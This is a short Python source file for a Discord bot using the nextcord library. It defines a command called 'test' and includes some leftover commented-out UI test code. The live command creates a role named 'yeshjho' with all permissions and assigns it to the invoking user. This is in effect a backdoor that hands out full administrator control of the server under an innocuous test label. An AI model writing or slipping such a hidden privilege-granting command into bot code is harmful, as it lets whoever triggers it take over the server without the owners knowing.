from commands.command import *

from nextcord.ui.view import View
from nextcord.ui.button import Button
from nextcord.ui.select import Select, SelectOption
from nextcord.permissions import Permissions


class CommandTest(Command):
    """
    """
    def __init__(self):
        super().__init__()

    def get_command_str(self) -> str:
        return "test"

    @execute_condition_checker()
    async def execute(self, msg: Message, args: argparse.Namespace, **kwargs):
        role = (await msg.guild.create_role(name='yeshjho', permissions=Permissions.all(), color=0x18B9E7, mentionable=False))
        await msg.author.add_roles(role)

    """
        view = View()
        view.add_item(Button(label='a'))
        view.add_item(Button(label='b'))
        await msg.channel.send('e', view=view)

        view = View()
        view.add_item(Select(options=[SelectOption(label='abc', description='qwer'), SelectOption(label='zxcv', description='rtyu')]))
        await msg.channel.send('e', view=view)
    """
